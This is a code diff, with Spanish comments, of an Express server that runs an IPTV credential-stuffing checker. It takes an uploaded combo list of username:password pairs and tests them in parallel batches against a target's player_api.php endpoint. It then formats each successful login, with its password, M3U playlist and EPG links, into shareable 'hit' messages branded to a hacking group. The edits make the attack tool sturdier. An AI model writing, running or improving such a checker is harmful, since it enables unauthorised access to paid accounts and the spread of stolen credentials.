@@ -2,22 +2,21 @@ const express = require('express');
 const multer = require('multer');
 const cors = require('cors');
 const path = require('path');
-const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3000;
 
 // Middleware
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Configurar multer para manejar archivos (usando memory storage para no guardar en disco)
 const upload = multer({ 
     storage: multer.memoryStorage(),
-    limits: { fileSize: 10 * 1024 * 1024 } // 10MB límite
+    limits: { fileSize: 10 * 1024 * 1024 }
 });
 
-// Mapeo de timezone a código de país (el mismo que tenías)
+// Mapeo de timezone a código de país
 const timezoneToCountryCode = {
     "Europe/Andorra":"AD", "Asia/Dubai":"AE", "Asia/Kabul":"AF", "America/Antigua":"AG",
     "America/Anguilla":"AI", "Europe/Tirane":"AL", "Asia/Yerevan":"AM", "Africa/Luanda":"AO",
@@ -97,7 +96,7 @@ function limparHost(host) {
 }
 
 async function fetchComTimeout(resource, options = {}) {
-    const { timeout = 8000 } = options;
+    const { timeout = 10000 } = options;
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), timeout);
     try {
@@ -135,59 +134,92 @@ async function getGeoLocation(hostOrIp) {
 async function getRealUserData(host, user, pass, printCategories) {
     const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
     try {
-        const userInfo = await fetchComTimeout(baseUrl).then(res => res.ok ? res.json() : Promise.reject('Invalid credentials'));
-
-        if (!userInfo.user_info || userInfo.user_info.auth !== 1) return null;
-
-        let categoryPromises = { live: Promise.resolve([]), vod: Promise.resolve([]), series: Promise.resolve([]) };
-        const fetchCategory = action => fetchComTimeout(`${baseUrl}&action=${action}`).then(res => res.ok ? res.json() : []).catch(() => []);
+        console.log(`Probando: ${user}:${pass} en ${host}`);
         
-        if (printCategories) {
-            categoryPromises.live = fetchCategory('get_live_categories');
-            categoryPromises.vod = fetchCategory('get_vod_categories');
-            categoryPromises.series = fetchCategory('get_series_categories');
+        const response = await fetchComTimeout(baseUrl);
+        if (!response.ok) {
+            console.log(`Respuesta no OK: ${response.status}`);
+            return null;
         }
         
-        const fetchAndCount = (action) => fetchComTimeout(`${baseUrl}&action=${action}`)
-            .then(res => res.ok ? res.json() : [])
-            .then(data => Array.isArray(data) ? data.length : 0)
-            .catch(() => 0);
-
-        const liveCountPromise = (userInfo.user_info.live_streams_count !== undefined && userInfo.user_info.live_streams_count > 0)
-            ? Promise.resolve(userInfo.user_info.live_streams_count) 
-            : fetchAndCount('get_live_streams');
-
-        const vodCountPromise = (userInfo.user_info.vod_streams_count !== undefined && userInfo.user_info.vod_streams_count > 0)
-            ? Promise.resolve(userInfo.user_info.vod_streams_count) 
-            : fetchAndCount('get_vod_streams');
+        const userInfo = await response.json();
+        
+        if (!userInfo.user_info || userInfo.user_info.auth !== 1) {
+            console.log(`Auth falló para ${user}`);
+            return null;
+        }
+        
+        console.log(`✅ HIT encontrado: ${user}`);
+        
+        let live_categories = [];
+        let vod_categories = [];
+        let series_categories = [];
+        
+        if (printCategories === true || printCategories === 'true') {
+            try {
+                const liveCatRes = await fetchComTimeout(`${baseUrl}&action=get_live_categories`);
+                if (liveCatRes.ok) live_categories = await liveCatRes.json();
+            } catch(e) { console.log('Error obteniendo categorías live'); }
             
-        const seriesCountPromise = (userInfo.user_info.series_count !== undefined && userInfo.user_info.series_count > 0)
-            ? Promise.resolve(userInfo.user_info.series_count) 
-            : fetchAndCount('get_series');
-
-        const [live_categories, vod_categories, series_categories, live_streams_count, vod_streams_count, series_count] = 
-            await Promise.all([
-                categoryPromises.live,
-                categoryPromises.vod,
-                categoryPromises.series,
-                liveCountPromise,
-                vodCountPromise,
-                seriesCountPromise
-            ]);
+            try {
+                const vodCatRes = await fetchComTimeout(`${baseUrl}&action=get_vod_categories`);
+                if (vodCatRes.ok) vod_categories = await vodCatRes.json();
+            } catch(e) { console.log('Error obteniendo categorías vod'); }
+            
+            try {
+                const seriesCatRes = await fetchComTimeout(`${baseUrl}&action=get_series_categories`);
+                if (seriesCatRes.ok) series_categories = await seriesCatRes.json();
+            } catch(e) { console.log('Error obteniendo categorías series'); }
+        }
+        
+        let live_streams_count = userInfo.user_info.live_streams_count || 0;
+        let vod_streams_count = userInfo.user_info.vod_streams_count || 0;
+        let series_count = userInfo.user_info.series_count || 0;
+        
+        if (live_streams_count === 0) {
+            try {
+                const liveRes = await fetchComTimeout(`${baseUrl}&action=get_live_streams`);
+                if (liveRes.ok) {
+                    const liveData = await liveRes.json();
+                    live_streams_count = Array.isArray(liveData) ? liveData.length : 0;
+                }
+            } catch(e) {}
+        }
+        
+        if (vod_streams_count === 0) {
+            try {
+                const vodRes = await fetchComTimeout(`${baseUrl}&action=get_vod_streams`);
+                if (vodRes.ok) {
+                    const vodData = await vodRes.json();
+                    vod_streams_count = Array.isArray(vodData) ? vodData.length : 0;
+                }
+            } catch(e) {}
+        }
+        
+        if (series_count === 0) {
+            try {
+                const seriesRes = await fetchComTimeout(`${baseUrl}&action=get_series`);
+                if (seriesRes.ok) {
+                    const seriesData = await seriesRes.json();
+                    series_count = Array.isArray(seriesData) ? seriesData.length : 0;
+                }
+            } catch(e) {}
+        }
         
         return {
             ...userInfo.user_info,
             server_info: userInfo.server_info,
             timezone: userInfo.server_info?.timezone,
-            live_streams_count,
-            vod_streams_count,
-            series_count,
-            live_categories,
-            vod_categories,
-            series_categories,
+            live_streams_count: live_streams_count,
+            vod_streams_count: vod_streams_count,
+            series_count: series_count,
+            live_categories: live_categories,
+            vod_categories: vod_categories,
+            series_categories: series_categories,
         };
+        
     } catch (error) {
-        console.warn(`API Error for ${user}:`, error.message || error);
+        console.log(`Error para ${user}:`, error.message);
         return null;
     }
 }
@@ -202,14 +234,14 @@ function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) 
     }
 
     let locationText = 'N/A';
-    if (geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
+    if (geoLocation && geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
         const flag = geoLocation.countryCode.toUpperCase().split('').map(char => 
             String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
         locationText = `${geoLocation.country}/${geoLocation.city} ${flag} [${geoLocation.countryCode}]`;
     }
 
     const messageText = info.message && info.message.trim() !== '' ? info.message : 'IPTV FOR FREE!';
-    const realServerUrl = `http://${info.server_info.url}:${info.server_info.port}`;
+    const realServerUrl = info.server_info ? `http://${info.server_info.url}:${info.server_info.port}` : `http://${host}`;
     
     let endsLine = '';
     let durationLine = '';
@@ -217,7 +249,7 @@ function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) 
     if (!info.exp_date || isNaN(info.exp_date) || info.exp_date == 0) {
         endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ «[🤴UNLIMITED🤴]»`;
     } else {
-        const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('en-GB', {
+        const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('es-ES', {
             day: 'numeric',
             month: 'long',
             year: 'numeric'
@@ -232,29 +264,29 @@ function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) 
     }
 
     let categoryText = "";
-    if (config.printCategories) {
+    if (config.printCategories === true || config.printCategories === 'true') {
         const formatCategoryList = (titleEmoji, title, list, separator, notFoundMsg) => {
-            const cleanSeparator = separator.trim();
+            const cleanSeparator = separator ? separator.trim() : '«[📺]»';
             if (!list || list.length === 0) {
                 return `\n${titleEmoji} ${title}\n${cleanSeparator} ${notFoundMsg} ${cleanSeparator}`;
             }
-            const names = list.map(c => c.category_name.toUpperCase()).join(` ${cleanSeparator} `);
+            const names = list.map(c => c.category_name ? c.category_name.toUpperCase() : 'UNKNOWN').join(` ${cleanSeparator} `);
             return `\n${titleEmoji} ${title}\n${cleanSeparator} ${names} ${cleanSeparator}`;
         };
         categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiChannels, "𝐂𝐀𝐍𝐀𝐋 ➠ ", info.live_categories, config.channelSeparator, "NO CHANNELS FOUND");
         categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiMovies, "𝐌𝐎𝐕𝐈𝐄𝐒 ➠ ", info.vod_categories, config.movieSeparator, "NO MOVIES FOUND");
         categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiSeries, "𝐒𝐄𝐑𝐈𝐄𝐒 ➠ ", info.series_categories, config.seriesSeparator, "NO SERIES FOUND");
     } else {
-        const cleanChannelSep = config.channelSeparator.trim();
-        const cleanMovieSep = config.movieSeparator.trim();
-        const cleanSeriesSep = config.seriesSeparator.trim();
+        const cleanChannelSep = config.channelSeparator ? config.channelSeparator.trim() : '«[📺]»';
+        const cleanMovieSep = config.movieSeparator ? config.movieSeparator.trim() : '«[🎬]»';
+        const cleanSeriesSep = config.seriesSeparator ? config.seriesSeparator.trim() : '«[📺]»';
         categoryText = `\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiChannels} 𝐂𝐀𝐍𝐀𝐋 ➠ \n${cleanChannelSep} H I D D E N ${cleanChannelSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiMovies} 𝐌𝐎𝐕𝐈𝐄𝐒 ➠ \n${cleanMovieSep} H I D D E N ${cleanMovieSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiSeries} 𝐒𝐄𝐑𝐈𝐄𝐒 ➠ \n${cleanSeriesSep} H I D D E N ${cleanSeriesSep}`;
     }
     
     const now = new Date();
-    const dateString = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+    const dateString = now.toLocaleDateString('es-ES', { day: 'numeric', month: 'long', year: 'numeric' });
     const timeString = now.toTimeString().slice(0, 5);
-    const footer = `\n━━━━━━━━━━━━━━━━━━━━\n📆 D𝙰𝚃𝙴 ➠ ${dateString}\n⏰️ T𝙸𝙼𝙴 ➠ ${timeString}\n⌨️ B𝚈 ➠ @hacker056\n👀 GRUPO ➠ Team Stablack\n${config.emojiCanal} VISITA EL CANAL(${config.canalLink || "https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04"})\n━━━━━━━━━━━━━━━━━━━━\nTeam Stablack 𝚂𝙲𝙰𝙽\n━━━━━━━━━━━━━━━━━━━━`;
+    const footer = `\n━━━━━━━━━━━━━━━━━━━━\n📆 D𝙰𝚃𝙴 ➠ ${dateString}\n⏰️ T𝙸𝙼𝙴 ➠ ${timeString}\n⌨️ B𝚈 ➠ ${nick}\n👀 GRUPO ➠ Team Starblack\n${config.emojiCanal || '📬'} VISITA EL CANAL (${config.canalLink || "https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04"})\n━━━━━━━━━━━━━━━━━━━━\nTeam Starblack 𝚂𝙲𝙰𝙽\n━━━━━━━━━━━━━━━━━━━━`;
 
     let texto = 
 `━━━━━━━━━━━━━━━━━━━━
@@ -269,16 +301,16 @@ ${endsLine}${durationLine}
 ${emojis.usuario} USUARIO ➠ ${user}
 ${emojis.senha} CONTRASEÑA ➠ ${pass}
 ${emojis.emojiTrial} T𝚁𝙸𝙰𝙻 ➠ [${info.is_trial == 1 ? "YES" : "NO"}]
-${emojis.status} ESTADO ➠ ${info.status ? info.status.toUpperCase() : "INACTIVE"}
+${emojis.status} ESTADO ➠ ${info.status ? info.status.toUpperCase() : "ACTIVE"}
 ${emojis.conexoes} MAXIMA CONEXIONES ➠ [${info.max_connections || "N/A"}]
 ${emojis.conectados} CONEXIONES ACTIVAS ➠ [${info.active_cons || "0"}]
 ${emojis.emojiTimezone} ZONA HORARIA ➠ ${timezoneText}
 ${emojis.emojiMessage} MENSAJE ➠ ${messageText}
 ${emojis.hitsPor} H𝙸𝚃𝚂 B𝚈 ➠ ${nick}
 ━━━━━━━━━━━━━━━━━━━━
-${emojis.linkM3U} H𝙾𝚂𝚃 M𝟹𝚄 ➠ [G𝙴𝚃 H𝙾𝚂𝚃 M𝟹𝚄](http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus)
-${emojis.emojiRealM3U} R𝙴𝙰𝙻 M𝟹𝚄 ➠ [G𝙴𝚃 R𝙴𝙰𝙻 M𝟹𝚄](${realServerUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus)
-${emojis.emojiEpgLink} E𝙿𝙶 L𝙸𝙽𝙺 ➠ [G𝙴𝚃 E𝙿𝙶 L𝙸𝙽𝙺](http://${host}/xmltv.php?username=${user}&password=${pass})
+${emojis.linkM3U} H𝙾𝚂𝚃 M𝟹𝚄 ➠ http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus
+${emojis.emojiRealM3U} R𝙴𝙰𝙻 M𝟹𝚄 ➠ ${realServerUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus
+${emojis.emojiEpgLink} E𝙿𝙶 L𝙸𝙽𝙺 ➠ http://${host}/xmltv.php?username=${user}&password=${pass}
 ━━━━━━━━━━━━━━━━━━━━
 ${emojis.emojiChannels} T𝙾𝚃𝙰𝙻 CANALES ➠ [${info.live_streams_count || 0}]
 ${emojis.emojiMovies} T𝙾𝚃𝙰𝙻 PELICULAS ➠ [${info.vod_streams_count || 0}]
@@ -289,24 +321,58 @@ footer;
     return texto;
 }
 
-// Endpoint principal para escanear
+// Endpoint principal
 app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
+    console.log('=== NUEVO ESCANEO INICIADO ===');
+    
     try {
-        const { host, nick, numBots, printCategories, channelSeparator, movieSeparator, seriesSeparator, canalLink, emojiCanal } = req.body;
-        const emojis = JSON.parse(req.body.emojis);
-        const comboText = req.file.buffer.toString('utf-8');
+        const { host, nick, numBots, printCategories, channelSeparator, movieSeparator, seriesSeparator, canalLink, emojiCanal, emojis: emojisJson } = req.body;
         
-        const combos = comboText.split(/\r?\n/).filter(l => l.includes(':'));
-        const total = combos.length;
+        if (!host) {
+            return res.status(400).json({ success: false, error: 'Host es requerido' });
+        }
+        
+        if (!req.file) {
+            return res.status(400).json({ success: false, error: 'Archivo de combos es requerido' });
+        }
+        
+        const comboText = req.file.buffer.toString('utf-8');
+        const combos = comboText.split(/\r?\n/).filter(l => l.includes(':') && l.trim().length > 0);
+        
+        if (combos.length === 0) {
+            return res.status(400).json({ success: false, error: 'No se encontraron combos válidos en el archivo' });
+        }
+        
+        console.log(`Host: ${host}`);
+        console.log(`Combos a probar: ${combos.length}`);
+        console.log(`Bots: ${numBots}`);
+        console.log(`Mostrar categorías: ${printCategories}`);
+        
         const bots = parseInt(numBots) || 20;
+        let emojis;
+        
+        try {
+            emojis = JSON.parse(emojisJson);
+        } catch(e) {
+            // Emojis por defecto si falla el parseo
+            emojis = {
+                emojiHeader: '★', hitsPor: '🎯', servidor: '🌐', usuario: '🤴',
+                senha: '🔐', criada: '🗓️', expira: '📆', status: '🔋',
+                emojiTrial: '⏲️', conectados: '👪', conexoes: '🧮',
+                emojiTimezone: '🕰️', linkM3U: '🔗', emojiEpgLink: '📑',
+                emojiMessage: '✍️', emojiChannels: '📺', emojiMovies: '🎬',
+                emojiSeries: '🎞️', emojiRealServer: '📡', emojiRealM3U: '⛓️',
+                emojiLocation: '🌍', emojiProtocol: '📖', emojiDuration: '⏳'
+            };
+        }
         
         const config = {
             printCategories: printCategories === 'true',
-            channelSeparator: channelSeparator,
-            movieSeparator: movieSeparator,
-            seriesSeparator: seriesSeparator,
-            canalLink: canalLink,
-            emojiCanal: emojiCanal
+            channelSeparator: channelSeparator || '«[⚽️]»',
+            movieSeparator: movieSeparator || '«[🍿]»',
+            seriesSeparator: seriesSeparator || '«[📹]»',
+            canalLink: canalLink || '',
+            emojiCanal: emojiCanal || '📬'
         };
         
         const hits = [];
@@ -316,7 +382,10 @@ app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
         
         // Función para procesar un combo
         async function processCombo(combo) {
-            const [user, pass] = combo.split(/:(.*)/s);
+            const parts = combo.split(/:(.*)/s);
+            const user = parts[0];
+            const pass = parts[1];
+            
             if (!user || !pass) {
                 invalidosCount++;
                 testadosCount++;
@@ -326,7 +395,7 @@ app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
             const realInfo = await getRealUserData(host, user, pass, config.printCategories);
             
             if (realInfo) {
-                const geoLocation = await getGeoLocation(realInfo.server_info.url);
+                const geoLocation = await getGeoLocation(realInfo.server_info?.url || host);
                 hitsCount++;
                 const hitFormatado = formatarHit(realInfo, host, user, pass, nick, emojis, config, geoLocation);
                 hits.push(hitFormatado);
@@ -339,22 +408,20 @@ app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
             }
         }
         
-        // Procesar en lotes
-        const comboChunks = [];
+        // Procesar en lotes para no sobrecargar
         for (let i = 0; i < combos.length; i += bots) {
-            comboChunks.push(combos.slice(i, i + bots));
+            const chunk = combos.slice(i, i + bots);
+            console.log(`Procesando lote ${Math.floor(i/bots) + 1}/${Math.ceil(combos.length/bots)} (${chunk.length} combos)`);
+            await Promise.all(chunk.map(combo => processCombo(combo)));
         }
         
-        for (const chunk of comboChunks) {
-            const results = await Promise.all(chunk.map(combo => processCombo(combo)));
-            // Enviar progreso al cliente (opcional, mediante Server-Sent Events)
-        }
+        console.log(`Escaneo completado. Hits: ${hitsCount}, Bad: ${invalidosCount}, Total: ${testadosCount}`);
         
         res.json({
             success: true,
             hits: hits,
             stats: {
-                total: total,
+                total: combos.length,
                 hits: hitsCount,
                 invalidos: invalidosCount,
                 testados: testadosCount
@@ -367,11 +434,11 @@ app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
     }
 });
 
-// Endpoint para health check (Render lo usa)
 app.get('/health', (req, res) => {
     res.status(200).send('OK');
 });
 
 app.listen(port, () => {
-    console.log(`✅ Servidor corriendo en http://localhost:${port}`);
+    console.log(`✅ Servidor Team Starblack corriendo en puerto ${port}`);
+    console.log(`📡 Accede en http://localhost:${port}`);
 });
